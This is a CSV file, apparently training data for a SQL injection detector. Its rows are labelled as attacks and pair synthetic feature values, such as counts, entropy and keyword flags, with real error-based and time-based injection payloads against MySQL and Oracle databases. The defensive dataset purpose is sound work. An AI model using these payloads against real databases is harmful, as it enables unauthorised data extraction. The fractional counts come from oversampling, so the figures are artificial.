id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000163,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,0.2604780308787487,226.35230919392419,32.18505451602166,3.4574270924470807,58.81494548397834,32.370109032043324,104.35230919392419,30.814945483978338,0.2598334343120423,0.14313542338458896,0.4609208024996122,0.13611033980375656,0.0,3.861209112983754,0.0925272580108304,0.0,1.0,1.046263629005415,0.0,19.814945483978338,0.0,0.0,4.0,2.1387908870162455,0.0,1.0,0.046263629005415266,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.04626362900541525,1.0,1.9537363709945847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000164,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,0.723006344483387,334.19183097377504,32.337204765196155,3.483518980962564,84.87785479975581,48.32559046960768,144.65118093921538,56.33720476519616,0.25366605102709233,0.14469788997900102,0.43305556792079924,0.1685804910731074,0.6744095303923148,0.0,0.0,0.0,0.0,2.0,0.0,30.494192852205764,0.0,0.5058071477942361,0.8313976174019211,22.0,0.16860238259807886,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.168602382598079,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.168602382598079
SMOTE_000165,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000062,0.7814470406644465,331.3870694630553,38.76612789429397,3.9372655271489503,110.7016163171181,55.0,127.85481367446735,37.83063947146985,0.3345044800289409,0.16613144717562367,0.3852977500185734,0.11406632277686203,4.0,0.0,0.0,0.0,2.0,1.7661278942939702,0.0,23.06451157717588,0.0,0.0,6.0,4.7661278942939695,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.76612789429397,0.23387210570602981,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000166,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,1.6643749405900485,209.72345347615152,29.98156356507677,3.456031126788326,52.47234534761515,33.52765465238485,94.7787627809212,28.9446906952303,0.250967776991481,0.16119821733446707,0.4501381676070441,0.13769583806700786,4.0,0.0,0.0,0.0,0.4907817825383835,1.4907817825383836,0.0,17.963127130153534,0.0,0.0,4.509218217461616,1.9815635650767671,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.9815635650767671,0.0,0.0,0.49078178253838356,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.472345347615151
SMOTE_000167,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,0.3987457564020521,330.6341000047496,31.804871429249946,3.4555119119925912,82.56102856600042,48.21948571699979,144.04871429249948,55.80487142924994,0.2498044428501151,0.14580906726423723,0.43560328586113417,0.16878320402451347,0.0,0.0,0.0,0.0,0.0,2.0,0.0,30.609742858499896,0.0,0.5853857122501586,0.804871429249947,22.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000168,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,0.3971621613783896,213.98756228914266,35.71783934595924,3.667611320059166,55.282160654040766,39.43567869191848,91.98756228914266,27.28216065404076,0.2583355937500328,0.18449043597470433,0.42972187957385377,0.12745209070140906,0.0,1.2116204905305703,1.8589196729796198,0.0,1.0,1.92945983648981,0.0,16.28216065404076,0.0,0.0,4.0,4.788379509469429,0.0,1.0,0.9294598364898099,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.9294598364898099,1.0,1.07054016351019,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000169,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.6858739404357614e-07,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000170,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,1.4913977231411457,315.4778636793987,37.745256502728296,4.021526369723419,109.0,56.98735067394212,114.49051300545659,35.0,0.3456319102853699,0.1804975903325371,0.3628877758959651,0.11098272348612795,3.0063246630289404,0.24841883424276479,0.49683766848552957,0.0,2.0,2.0,0.0,20.248418834242763,0.0,0.0,6.0,5.496837668485529,0.7515811657572351,0.24841883424276476,0.24841883424276479,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.24841883424276473,1.0,0.7515811657572352,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000171,attack,error,"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000028,2.7008698440801093,193.73841460104836,36.98146336167741,4.008209339225234,70.72914628188708,29.233780441467733,69.77548787769356,24.0,0.3648928275058421,0.15073404408781937,0.36047898401835365,0.12389414438798486,3.252317079790324,0.0,0.0,0.0,0.0,0.7476829202096762,0.0,13.756951239370972,0.0,0.0,4.0,2.243048760629028,1.0,0.0,0.0,0.7476829202096762,0.0,0.7476829202096762,1.0,0.0,0.0,1.0,0.7476829202096762,0.7476829202096762,0.0,0.7476829202096761,0.7476829202096762,0.2523170797903237,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.4953658404193515
SMOTE_000172,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000016,1.0176752763162955,331.2141221350112,36.0,3.6719416034484786,92.0,48.0,135.0,56.21412213501122,0.2777663593671875,0.14492157880027173,0.40759194037576424,0.16972012145677653,0.0,0.0,1.4282442700224478,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,23.428244270022446,0.0,0.0,0.2141221350112238,0.7858778649887763,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000173,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000054,0.32839558834209603,217.71355112837273,31.792141011670246,3.9295688368583264,80.16856404668098,37.0,76.75284607002149,23.792141011670246,0.36823154521251905,0.1700217183177514,0.35245691925601685,0.10928981721371267,4.0,0.0,0.0,0.0,0.0,1.2078589883297526,0.0,13.584282023340494,0.0,0.0,5.0,1.2078589883297521,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000174,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,0.01587526231548564,248.16995257986372,35.0098049565306,3.990739145578829,94.05556142034007,35.026146550748265,89.06209805802712,30.026146550748262,0.3790027377652842,0.14113623661680566,0.35887465777933947,0.12098636783857067,0.01307327537413161,0.0,0.0,0.0,2.0,1.003268318843533,0.0,18.006536637687066,0.0,2.0,5.996731681156467,3.0098049565305987,0.003268318843533069,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.003268318843533,0.0,0.003268318843532958,2.0,-1.1102230246251565e-16,0.003268318843532958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0098049565306
SMOTE_000175,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000044,1.788765440312187,219.80228956069874,31.337210008613752,3.6581548168749647,63.26742985356625,36.325579982772496,91.56974978465624,28.63952993970375,0.2872379405563946,0.16692703920355767,0.41563000188044225,0.13020501835960546,0.0,4.0,0.0,0.0,0.0,1.6627899913862498,0.0,16.651159965545,1.3255799827724994,0.0,5.0,1.6627899913862505,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.3372100086137502,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6627899913862498,0.6627899913862498,4.66278999138625
SMOTE_000176,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000020,1.3860198804699833,213.09293255263344,39.0,3.8014562591374887,63.0,37.0,88.91077712719454,24.182155425438907,0.29587479400516814,0.17376773616176544,0.41691695658531885,0.11344051324774754,0.40892228728054625,0.5910777127194538,1.0,0.0,1.0,0.9999999999999999,0.0,16.182155425438907,0.0,0.0,3.0,3.0,0.40892228728054625,0.5910777127194538,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000177,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,0.19151297666541434,313.6587893458345,37.13270314766676,4.01302828009606,109.06635157383337,55.0,114.3270314766676,35.26540629533352,0.3478362403212742,0.1754143516128272,0.36433453763068735,0.11241487043521124,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.26540629533352,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.06635157383338,0.9336484261666202,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000178,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000036,0.3559647914892308,332.281021757474,38.85766424916956,3.856550338507234,101.85766424916956,55.0,134.13868600664352,41.28467150166088,0.30657741822652196,0.16553708728753272,0.4036478512036162,0.12423764328232911,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.28467150166088,2.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.85766424916956,0.14233575083044003,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000179,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,1.0752134122856325,341.78072185542226,34.0,3.6662309057292024,98.48123746643812,46.609639072288886,138.91979375559364,57.77005156110159,0.28770814705510084,0.1365663382498854,0.40666919943632857,0.1690563152586852,3.3101546833047646,0.0,0.22994843889841177,0.0,0.0,2.0,0.0,28.459896877796822,0.0,2.3101546833047646,0.22994843889841166,22.22994843889841,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.5401031222031765,0.2299484388984118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.770051561101588
SMOTE_000180,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,0.074978237979597,249.42644279450235,36.014214759816745,4.012272224289015,94.11371807853396,35.113718078533964,89.17057711780095,31.02842951963349,0.3773406195228474,0.1407549956636204,0.35749478622190156,0.12440959859163055,0.9857852401832551,0.0,0.028429519633490108,0.0,2.0,1.014214759816745,0.0,18.014214759816745,0.0,2.0,5.9857852401832545,3.0426442794502355,0.985785240183255,0.0,0.014214759816745026,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.014214759816745026,2.0,0.014214759816745026,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.028429519633491
SMOTE_000181,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000032,0.3688192584999266,190.1620766332838,30.93516934668649,3.656748133072157,63.57860075346218,24.356568593224306,78.16207663328377,24.06483065331351,0.33440111305337794,0.12803935744976538,0.41101626404663383,0.12654326545022285,4.0,0.0,0.0,0.0,0.0,0.03241532665675484,0.0,16.0,0.0,0.0,4.032415326656755,0.032415326656754395,1.0,0.0,0.0,0.0,0.0,0.03241532665675495,1.0,0.0,0.0,1.0,0.0,0.03241532665675484,0.0,0.0,0.0,1.0,0.03241532665675495,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.967584673343245,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0324153266567544
SMOTE_000182,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,1.4990663667147244,192.44283373435889,28.934299759384682,3.6132743834817425,47.31143325312823,38.73719903753874,79.08276819056367,27.31143325312823,0.2459118765502648,0.20167232402170823,0.4104460852437912,0.14196971418423573,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.754266987487089,0.0,0.0,5.311433253128228,3.245733012512911,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.31143325312822784,1.3114332531282276,0.0,0.3114332531282278,0.0,0.6885667468717722,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.311433253128228
SMOTE_000183,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000067,0.3384970658242897,327.0,40.89624316095326,4.052706194308633,110.0,63.0,119.0,35.0,0.3363914373088685,0.1926605504587156,0.363914373088685,0.10703363914373089,0.10375683904673805,0.896243160953262,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.10375683904673821,0.896243160953262,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000184,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000030,0.8894326192485651,284.99463928767074,39.24798973287652,4.020469158182102,105.7466495547942,43.0,102.49865982191768,33.74932991095884,0.3710097288529862,0.150902682684927,0.35966764730009226,0.11841994116199446,0.0,0.7493299109588397,2.0,0.0,2.0,2.0,0.0,19.0,0.0,2.0,5.0,6.0,0.0,0.7493299109588396,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.25067008904116017,0.7493299109588398,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000185,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,2.5994867381611404,260.2825947508402,35.84707550005795,3.964024942193829,96.11768875014486,35.0,95.77660400046356,33.38830200023178,0.3698704859592545,0.13487115965588378,0.3674223660662948,0.12783598831856696,0.0,1.6941510001158913,0.0,0.0,2.0,1.4235377500289728,0.0,18.847075500057947,0.8470755000579457,2.0,5.576462249971027,3.4235377500289728,0.0,0.42353775002897287,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.42353775002897287,0.42353775002897287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.847075500057946
SMOTE_000186,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,0.9305999506618171,221.71198091275284,31.294930788367044,3.4485870103012277,56.70852506219289,33.41013842326591,101.82718854765169,29.766128879642324,0.25525678828384735,0.1519112241524469,0.4588656679370712,0.13396631962663455,0.0,3.2949307883670427,0.0,0.0,1.0,1.176267302908239,0.0,19.294930788367044,0.0,0.0,4.0,2.17626730290824,0.0,0.8237326970917607,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.8237326970917607,0.1762673029082394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000187,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000012,1.176249668927661,220.00844754730173,33.0,3.591880255972994,62.48002961169015,33.17895516097109,95.82104483902891,28.528417935611564,0.28312661815255075,0.1506593544996046,0.4362884730794384,0.1299255542684062,0.0,4.0,0.0,0.0,0.7642089678057816,1.2357910321942183,0.0,17.528417935611564,0.0,0.0,4.235791032194219,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.5284179356115635,0.0,0.0,0.7642089678057816,1.0,0.7642089678057817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2357910321942184,0.2357910321942184,6.5284179356115635
